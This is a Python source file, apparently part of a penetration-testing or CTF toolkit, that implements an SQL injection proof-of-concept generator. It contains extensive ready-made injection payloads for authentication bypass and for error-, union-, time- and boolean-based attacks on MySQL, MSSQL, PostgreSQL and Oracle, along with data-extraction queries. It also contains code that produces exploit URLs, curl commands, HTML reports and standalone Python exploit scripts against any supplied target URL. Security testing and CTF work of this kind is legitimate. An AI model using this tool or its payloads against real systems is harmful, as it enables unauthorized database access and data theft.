"""SQLi PoC Generator for CTF challenges."""

from dataclasses import dataclass
from typing import Optional
from urllib.parse import quote, urlencode
import json

from .poc_generator import PocGenerator, PocResult, PocType


@dataclass
class ExtractionResult:
    """Result of data extraction."""
    database: Optional[str] = None
    tables: list[str] = None
    columns: dict[str, list[str]] = None
    data: list[dict] = None
    
    def __post_init__(self):
        if self.tables is None:
            self.tables = []
        if self.columns is None:
            self.columns = {}
        if self.data is None:
            self.data = []


class SqliPocGenerator(PocGenerator):
    """Generate SQLi PoC for CTF challenges."""
    
    # Common SQLi payloads by type
    PAYLOADS = {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR '1'='1'--",
            "1' OR '1'='1",
        ],
        "error_based": {
            "mysql": [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "mssql": [
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
            ],
            "postgresql": [
                "' AND 1=CAST((SELECT version()) AS int)--",
                "' AND 1::int=(SELECT version())--",
            ],
            "oracle": [
                "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
            ],
        },
        "union_based": {
            "mysql": [
                "' UNION SELECT NULL,version(),NULL--",
                "' UNION SELECT NULL,user(),NULL--",
                "' UNION SELECT NULL,database(),NULL--",
                "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
            ],
            "mssql": [
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,user_name(),NULL--",
                "' UNION SELECT NULL,db_name(),NULL--",
            ],
            "postgresql": [
                "' UNION SELECT NULL,version(),NULL--",
                "' UNION SELECT NULL,current_user,NULL--",
                "' UNION SELECT NULL,current_database(),NULL--",
            ],
            "oracle": [
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' UNION SELECT NULL,user,NULL FROM dual--",
            ],
        },
        "time_based": {
            "mysql": [
                "' AND SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
            ],
            "mssql": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND IF 1=1 WAITFOR DELAY '0:0:5'--",
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT pg_sleep(5)) IS NOT NULL--",
            ],
            "oracle": [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x'--",
            ],
        },
        "boolean_based": {
            "mysql": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(version(),1,1)='5'--",
            ],
            "mssql": [
                "' AND 1=1--",
                "' AND 1=2--",
            ],
            "postgresql": [
                "' AND 1=1--",
                "' AND 1=2--",
            ],
            "oracle": [
                "' AND 1=1--",
                "' AND 1=2--",
            ],
        },
    }
    
    # Extraction queries by DB type
    EXTRACTION_QUERIES = {
        "mysql": {
            "version": "SELECT version()",
            "user": "SELECT user()",
            "database": "SELECT database()",
            "tables": "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
            "columns": "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'",
            "data": "SELECT GROUP_CONCAT({columns}) FROM {table}",
        },
        "mssql": {
            "version": "SELECT @@version",
            "user": "SELECT user_name()",
            "database": "SELECT db_name()",
            "tables": "SELECT STRING_AGG(table_name,',') FROM information_schema.tables",
            "columns": "SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
            "data": "SELECT {columns} FROM {table}",
        },
        "postgresql": {
            "version": "SELECT version()",
            "user": "SELECT current_user",
            "database": "SELECT current_database()",
            "tables": "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
            "columns": "SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
            "data": "SELECT {columns} FROM {table}",
        },
        "oracle": {
            "version": "SELECT banner FROM v$version WHERE rownum=1",
            "user": "SELECT user FROM dual",
            "database": "SELECT ora_database_name FROM dual",
            "tables": "SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables",
            "columns": "SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='{table}'",
            "data": "SELECT {columns} FROM {table}",
        },
    }
    
    # HTML Template
    HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SQLi PoC - {title}</title>
    <style>
        body {{ font-family: 'Consolas', monospace; margin: 40px; background: #0d1117; color: #c9d1d9; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        h1 {{ color: #ff7b72; }}
        h2 {{ color: #79c0ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }}
        .info {{ background: #161b22; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #30363d; }}
        .code {{ background: #0d1117; padding: 15px; border-radius: 4px; font-family: monospace; 
                white-space: pre-wrap; word-break: break-all; margin: 10px 0; border: 1px solid #30363d;
                overflow-x: auto; }}
        .payload {{ background: #1f2937; padding: 10px 15px; border-radius: 4px; margin: 5px 0;
                   border-left: 3px solid #ff7b72; }}
        .btn {{ background: #238636; color: white; padding: 10px 20px; border: none; 
               border-radius: 6px; cursor: pointer; font-size: 14px; margin: 5px; }}
        .btn:hover {{ background: #2ea043; }}
        .btn-danger {{ background: #da3633; }}
        .btn-danger:hover {{ background: #f85149; }}
        .warning {{ color: #f0883e; margin: 20px 0; padding: 15px; background: #1c1305; 
                   border-radius: 4px; border: 1px solid #9e6a03; }}
        a {{ color: #58a6ff; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ padding: 12px; text-align: left; border: 1px solid #30363d; }}
        th {{ background: #161b22; color: #8b949e; }}
        .success {{ color: #3fb950; }}
        .extracted {{ background: #0d419d; padding: 3px 8px; border-radius: 3px; }}
        .step {{ background: #21262d; padding: 15px; margin: 10px 0; border-radius: 6px; 
                border-left: 3px solid #58a6ff; }}
        .step-num {{ background: #58a6ff; color: #0d1117; padding: 2px 8px; border-radius: 4px; 
                    font-weight: bold; margin-right: 10px; }}
        pre {{ margin: 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>SQL Injection PoC</h1>
        
        <div class="warning">
            <strong>⚠️ Warning:</strong> This PoC is for authorized security testing only.
            SQL injection can cause data loss. Use responsibly.
        </div>
        
        <div class="info">
            <h2>Target Information</h2>
            <table>
                <tr><th>Target URL</th><td><a href="{target_url}" target="_blank">{target_url}</a></td></tr>
                <tr><th>Vulnerable Parameter</th><td><span class="extracted">{param}</span></td></tr>
                <tr><th>HTTP Method</th><td>{method}</td></tr>
                <tr><th>Database Type</th><td>{db_type}</td></tr>
                <tr><th>Injection Type</th><td>{injection_type}</td></tr>
            </table>
        </div>
        
        <h2>Payload</h2>
        <div class="payload">{payload}</div>
        
        <h2>Exploit URL</h2>
        <div class="code"><a href="{exploit_url}" target="_blank">{exploit_url}</a></div>
        
        <h2>cURL Command</h2>
        <div class="code">{curl_command}</div>
        <button class="btn" onclick="copyText(this.previousElementSibling.textContent)">Copy</button>
        
        {extraction_section}
        
        <h2>Steps to Reproduce</h2>
        {steps_html}
        
        <h2>Expected Result</h2>
        <div class="info">{expected_result}</div>
        
        <h2>Python Exploit Script</h2>
        <div class="code"><pre>{python_script}</pre></div>
        <button class="btn" onclick="copyText(document.querySelector('pre').textContent)">Copy Script</button>
        
        <h2>Additional Payloads</h2>
        <div class="info">
            {additional_payloads}
        </div>
    </div>
    
    <script>
        function copyText(text) {{
            navigator.clipboard.writeText(text).then(() => alert('Copied!'));
        }}
    </script>
</body>
</html>
"""

    def __init__(self, *args, db_type: str = "mysql", **kwargs):
        super().__init__(*args, **kwargs)
        self.db_type = db_type.lower()
    
    def generate(
        self,
        injection_type: str = "union",
        payload: Optional[str] = None,
        num_columns: int = 3,
        extract_query: Optional[str] = None,
        output_dir: str = ".",
        save_html: bool = True,
    ) -> PocResult:
        """
        Generate SQLi PoC.
        
        Args:
            injection_type: Type of injection (union, error, time, boolean, auth_bypass)
            payload: Custom payload to use
            num_columns: Number of columns for UNION-based injection
            extract_query: Custom extraction query
            output_dir: Directory to save HTML file
            save_html: Whether to save standalone HTML file
        
        Returns:
            PocResult with generated PoC
        """
        # Generate or use provided payload
        if payload:
            sqli_payload = payload
        else:
            sqli_payload = self._get_payload(injection_type, num_columns)
        
        # Build exploit URL
        exploit_url = self.build_url_with_payload(sqli_payload)
        
        # Generate curl command
        if self.method == "POST":
            post_data = {**self.data, self.param: sqli_payload}
            curl_cmd = self.generate_curl_command(
                self.target_url,
                method="POST",
                data=post_data,
            )
        else:
            curl_cmd = self.generate_curl_command(exploit_url)
        
        # Generate Python script
        python_script = self._generate_python_script(sqli_payload, injection_type, extract_query)
        
        # Determine PoC type
        poc_type_map = {
            "union": PocType.SQLI_UNION,
            "error": PocType.SQLI_ERROR,
            "time": PocType.SQLI_TIME,
            "boolean": PocType.SQLI_BLIND,
            "auth_bypass": PocType.SQLI_ERROR,
        }
        poc_type = poc_type_map.get(injection_type, PocType.SQLI_UNION)
        
        # Evidence description
        evidence_desc = {
            "union": "UNION-based SQL injection extracts data through combined query results",
            "error": "Error-based SQL injection extracts data through database error messages",
            "time": "Time-based blind SQL injection infers data through response timing",
            "boolean": "Boolean-based blind SQL injection infers data through true/false responses",
            "auth_bypass": "Authentication bypass through SQL injection in login form",
        }.get(injection_type, "SQL injection vulnerability confirmed")
        
        # Steps to reproduce
        steps = self._generate_steps(injection_type, sqli_payload)
        
        # Expected result
        expected = self._generate_expected(injection_type)
        
        # Create result
        result = PocResult(
            poc_type=poc_type,
            target_url=self.target_url,
            payload=sqli_payload,
            curl_command=curl_cmd,
            python_script=python_script,
            evidence_description=evidence_desc,
            steps_to_reproduce=steps,
            expected_result=expected,
        )
        
        # Save HTML file
        if save_html:
            html_content = self._generate_html(
                payload=sqli_payload,
                exploit_url=exploit_url,
                curl_cmd=curl_cmd,
                python_script=python_script,
                injection_type=injection_type,
                steps=steps,
                expected=expected,
            )
            filename = f"sqli_poc_{injection_type}.html"
            result.html_file = self.save_html(html_content, filename, output_dir)
        
        return result
    
    def generate_extraction_poc(
        self,
        target_table: str,
        target_columns: list[str],
        num_columns: int = 3,
        inject_position: int = 2,
        output_dir: str = ".",
    ) -> PocResult:
        """
        Generate SQLi PoC for data extraction.
        
        Args:
            target_table: Table to extract from
            target_columns: Columns to extract
            num_columns: Number of columns in original query
            inject_position: Position to inject data (1-indexed)
            output_dir: Directory to save files
        
        Returns:
            PocResult with extraction PoC
        """
        # Build extraction payload
        columns_str = ",0x3a,".join(target_columns)
        
        if self.db_type == "mysql":
            extract_payload = f"' UNION SELECT {self._build_null_columns(num_columns, inject_position, f'CONCAT({columns_str})')} FROM {target_table}--"
        elif self.db_type == "mssql":
            extract_payload = f"' UNION SELECT {self._build_null_columns(num_columns, inject_position, f'{columns_str}')} FROM {target_table}--"
        else:
            extract_payload = f"' UNION SELECT {self._build_null_columns(num_columns, inject_position, f'{columns_str}')} FROM {target_table}--"
        
        result = self.generate(
            injection_type="union",
            payload=extract_payload,
            output_dir=output_dir,
        )
        
        result.evidence_description = f"Extracting columns [{', '.join(target_columns)}] from table '{target_table}'"
        
        return result
    
    def get_enumeration_payloads(self, num_columns: int = 3) -> dict:
        """
        Get payloads for database enumeration.
        
        Returns dict with payloads for:
        - version
        - user
        - database
        - tables
        """
        queries = self.EXTRACTION_QUERIES.get(self.db_type, self.EXTRACTION_QUERIES["mysql"])
        
        payloads = {}
        for query_name, query in queries.items():
            if query_name in ["version", "user", "database"]:
                null_cols = self._build_null_columns(num_columns, 2, f"({query})")
                payloads[query_name] = f"' UNION SELECT {null_cols}--"
        
        # Tables enumeration
        null_cols = self._build_null_columns(num_columns, 2, f"({queries['tables']})")
        payloads["tables"] = f"' UNION SELECT {null_cols}--"
        
        return payloads
    
    def _get_payload(self, injection_type: str, num_columns: int) -> str:
        """Get payload for injection type."""
        if injection_type == "auth_bypass":
            return self.PAYLOADS["auth_bypass"][0]
        
        payloads = self.PAYLOADS.get(injection_type, {})
        if isinstance(payloads, dict):
            db_payloads = payloads.get(self.db_type, payloads.get("mysql", []))
            return db_payloads[0] if db_payloads else "' OR 1=1--"
        return payloads[0] if payloads else "' OR 1=1--"
    
    def _build_null_columns(self, num_columns: int, inject_pos: int, value: str) -> str:
        """Build NULL columns with value at inject position."""
        columns = []
        for i in range(1, num_columns + 1):
            if i == inject_pos:
                columns.append(value)
            else:
                columns.append("NULL")
        return ",".join(columns)
    
    def _generate_steps(self, injection_type: str, payload: str) -> list[str]:
        """Generate steps to reproduce."""
        base_steps = [
            f"Navigate to: {self.target_url}",
            f"Locate the '{self.param}' parameter",
        ]
        
        if injection_type == "auth_bypass":
            base_steps.extend([
                "Enter the payload in the login field",
                f"Payload: {payload}",
                "Submit the login form",
                "Observe that authentication is bypassed",
            ])
        elif injection_type == "union":
            base_steps.extend([
                "First, determine the number of columns using ORDER BY",
                "Then inject the UNION payload",
                f"Payload: {payload}",
                "Observe extracted data in the response",
            ])
        elif injection_type == "time":
            base_steps.extend([
                "Inject the time-based payload",
                f"Payload: {payload}",
                "Measure the response time (should be delayed by 5 seconds)",
                "Use binary search to extract data character by character",
            ])
        elif injection_type == "boolean":
            base_steps.extend([
                "Send a TRUE condition and note the response",
                "Send a FALSE condition and note the difference",
                f"Payload: {payload}",
                "Use the difference to extract data bit by bit",
            ])
        else:
            base_steps.extend([
                f"Inject the payload: {payload}",
                "Observe the database error in the response",
                "Extract data from the error message",
            ])
        
        return base_steps
    
    def _generate_expected(self, injection_type: str) -> str:
        """Generate expected result description."""
        expected = {
            "auth_bypass": "Login form is bypassed and you gain access without valid credentials",
            "union": "Database information (version, user, tables, data) appears in the page content",
            "error": "Database error messages reveal sensitive information like version, user, or data",
            "time": "Response is delayed by exactly 5 seconds, confirming the injection point",
            "boolean": "Page content or behavior differs between TRUE and FALSE conditions",
        }
        return expected.get(injection_type, "SQL injection is confirmed and exploitable")
    
    def _generate_html(
        self,
        payload: str,
        exploit_url: str,
        curl_cmd: str,
        python_script: str,
        injection_type: str,
        steps: list[str],
        expected: str,
    ) -> str:
        """Generate HTML PoC page."""
        # Steps HTML
        steps_html = "\n".join(
            f'<div class="step"><span class="step-num">{i}</span>{step}</div>'
            for i, step in enumerate(steps, 1)
        )
        
        # Extraction section for UNION-based
        extraction_section = ""
        if injection_type == "union":
            enum_payloads = self.get_enumeration_payloads()
            extraction_section = f"""
        <h2>Enumeration Payloads</h2>
        <div class="info">
            <table>
                <tr><th>Target</th><th>Payload</th></tr>
                <tr><td>Database Version</td><td class="payload">{self.escape_html(enum_payloads.get('version', ''))}</td></tr>
                <tr><td>Current User</td><td class="payload">{self.escape_html(enum_payloads.get('user', ''))}</td></tr>
                <tr><td>Current Database</td><td class="payload">{self.escape_html(enum_payloads.get('database', ''))}</td></tr>
                <tr><td>List Tables</td><td class="payload">{self.escape_html(enum_payloads.get('tables', ''))}</td></tr>
            </table>
        </div>
"""
        
        # Additional payloads
        all_payloads = []
        if injection_type in self.PAYLOADS:
            payloads_data = self.PAYLOADS[injection_type]
            if isinstance(payloads_data, dict):
                for p in payloads_data.get(self.db_type, [])[:5]:
                    all_payloads.append(f'<div class="payload">{self.escape_html(p)}</div>')
            else:
                for p in payloads_data[:5]:
                    all_payloads.append(f'<div class="payload">{self.escape_html(p)}</div>')
        additional_payloads = "\n".join(all_payloads) or "<p>No additional payloads</p>"
        
        return self.HTML_TEMPLATE.format(
            title=f"{injection_type.upper()} SQLi",
            target_url=self.escape_html(self.target_url),
            param=self.param or "N/A",
            method=self.method,
            db_type=self.db_type.upper(),
            injection_type=injection_type.replace("_", " ").title(),
            payload=self.escape_html(payload),
            exploit_url=self.escape_html(exploit_url),
            curl_command=self.escape_html(curl_cmd),
            extraction_section=extraction_section,
            steps_html=steps_html,
            expected_result=expected,
            python_script=self.escape_html(python_script),
            additional_payloads=additional_payloads,
        )
    
    def _generate_python_script(
        self,
        payload: str,
        injection_type: str,
        extract_query: Optional[str],
    ) -> str:
        """Generate Python exploit script."""
        script = f'''#!/usr/bin/env python3
"""
SQLi PoC Script - {injection_type}
Target: {self.target_url}
Database: {self.db_type}
"""

import requests
import time
from urllib.parse import quote

TARGET_URL = "{self.target_url}"
PARAM = "{self.param}"
METHOD = "{self.method}"
DB_TYPE = "{self.db_type}"
PAYLOAD = """{payload}"""

def test_injection():
    """Test if injection point is vulnerable."""
    print("[*] Testing SQL injection...")
    
    if METHOD == "GET":
        # Build URL with payload
        test_url = TARGET_URL.replace(f"{{PARAM}}=", f"{{PARAM}}={{quote(PAYLOAD)}}")
        if "?" not in test_url:
            test_url = f"{{TARGET_URL}}?{{PARAM}}={{quote(PAYLOAD)}}"
        response = requests.get(test_url, timeout=10)
    else:
        data = {{PARAM: PAYLOAD}}
        response = requests.post(TARGET_URL, data=data, timeout=10)
    
    return response

def exploit():
    """Execute SQL injection exploit."""
    print("=" * 60)
    print("SQL Injection Proof of Concept")
    print("=" * 60)
    print()
    print(f"[*] Target: {{TARGET_URL}}")
    print(f"[*] Parameter: {{PARAM}}")
    print(f"[*] Database: {{DB_TYPE}}")
    print(f"[*] Injection Type: {injection_type}")
    print(f"[*] Payload: {{PAYLOAD[:60]}}...")
    print()
'''
        
        if injection_type == "time":
            script += '''
    # Time-based injection test
    print("[*] Testing time-based injection...")
    
    start_time = time.time()
    response = test_injection()
    elapsed = time.time() - start_time
    
    print(f"[*] Response time: {elapsed:.2f} seconds")
    
    if elapsed >= 4.5:  # Allow some margin
        print("[+] SUCCESS: Time-based SQLi confirmed!")
        print(f"[+] Response was delayed by {elapsed:.2f} seconds")
        return True
    else:
        print("[-] Time delay not detected")
        return False
'''
        elif injection_type == "boolean":
            script += '''
    # Boolean-based injection test
    print("[*] Testing boolean-based injection...")
    
    # Test TRUE condition
    true_payload = "' AND 1=1--"
    # Test FALSE condition  
    false_payload = "' AND 1=2--"
    
    if METHOD == "GET":
        true_url = f"{TARGET_URL}?{PARAM}={quote(true_payload)}"
        false_url = f"{TARGET_URL}?{PARAM}={quote(false_payload)}"
        true_resp = requests.get(true_url, timeout=10)
        false_resp = requests.get(false_url, timeout=10)
    else:
        true_resp = requests.post(TARGET_URL, data={PARAM: true_payload}, timeout=10)
        false_resp = requests.post(TARGET_URL, data={PARAM: false_payload}, timeout=10)
    
    if len(true_resp.text) != len(false_resp.text):
        print("[+] SUCCESS: Boolean-based SQLi confirmed!")
        print(f"[+] TRUE response length: {len(true_resp.text)}")
        print(f"[+] FALSE response length: {len(false_resp.text)}")
        return True
    else:
        print("[-] Response lengths are identical")
        return False
'''
        else:
            script += '''
    try:
        response = test_injection()
        
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Length: {len(response.text)}")
        
        # Check for common SQLi indicators
        indicators = ["syntax error", "mysql", "sql", "error", "warning", "query"]
        found = [i for i in indicators if i.lower() in response.text.lower()]
        
        if found:
            print(f"[+] SQL-related keywords found: {found}")
            print("[+] SQL Injection likely successful!")
            
            # Try to extract any visible data
            if "version()" in PAYLOAD.lower() or "@@version" in PAYLOAD.lower():
                print("[*] Checking for version information in response...")
            
            return True
        else:
            print("[*] No obvious SQL indicators found")
            print("[*] Manual verification may be required")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
'''
        
        script += '''

if __name__ == "__main__":
    exploit()
'''
        return script
